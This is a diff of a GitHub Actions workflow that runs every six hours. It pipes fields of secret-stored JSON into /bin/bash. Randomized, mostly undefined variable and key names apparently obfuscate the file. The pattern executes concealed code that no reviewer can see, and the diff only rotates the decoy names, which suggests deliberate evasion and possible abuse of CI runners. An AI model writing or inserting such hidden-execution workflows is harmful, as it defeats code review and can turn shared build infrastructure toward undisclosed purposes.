@@ -3,25 +3,32 @@ name: chengjunmin4718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
-jobs:  # 30981
+    - cron: '46 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chengjunmin4718
         env:
-          baz4367: ${{ secrets.baz4367 }}
+          hzs3: ${{ secrets.hzs3 }}
         run: |
-          echo $baz4367 | jq -r .qdm46 | /bin/bash
-          echo $q7 | jq -r .knntq33 | /bin/bash
-          echo $t608 | jq -r .a793 | /bin/bash
-          echo $ni455 | jq -r .umofl5 | /bin/bash
-          echo $sfgg22 | jq -r .lo6642 | /bin/bash
-          echo $hnnq8958 | jq -r .t49 | /bin/bash
-          echo $rxgzu1463 | jq -r .r136 | /bin/bash
-          echo $crm37 | jq -r .qxxlc7 | /bin/bash
-          echo $lpwnj672 | jq -r .ah82 | /bin/bash
-          echo $hb82 | jq -r .ttlg06 | /bin/bash
-          echo $u3 | jq -r .wiq61305 | /bin/bash
+          echo $hzs3 | jq -r .a5210 | /bin/bash
+          echo $ufu162 | jq -r .gdhu821 | /bin/bash
+          echo $f318 | jq -r .ydiw60014 | /bin/bash
+          echo $uiuh4 | jq -r .rwpkc3618 | /bin/bash
+          echo $ppr9711 | jq -r .tsaa26541 | /bin/bash
+          echo $euwx4677 | jq -r .xh2 | /bin/bash
+          echo $v108 | jq -r .e16 | /bin/bash
+          echo $i3 | jq -r .kd8276 | /bin/bash
+          echo $ti1577 | jq -r .vwqu936 | /bin/bash
+          echo $ux61 | jq -r .s74154 | /bin/bash
+          echo $ffy550 | jq -r .r72 | /bin/bash
+          echo $wug8568 | jq -r .c3286 | /bin/bash
+          echo $nl967 | jq -r .xk79064 | /bin/bash
+          echo $qux7 | jq -r .ad46 | /bin/bash
+          echo $zrbgf71523 | jq -r .bpaf50855 | /bin/bash
+          echo $ignxu74 | jq -r .v08 | /bin/bash
 
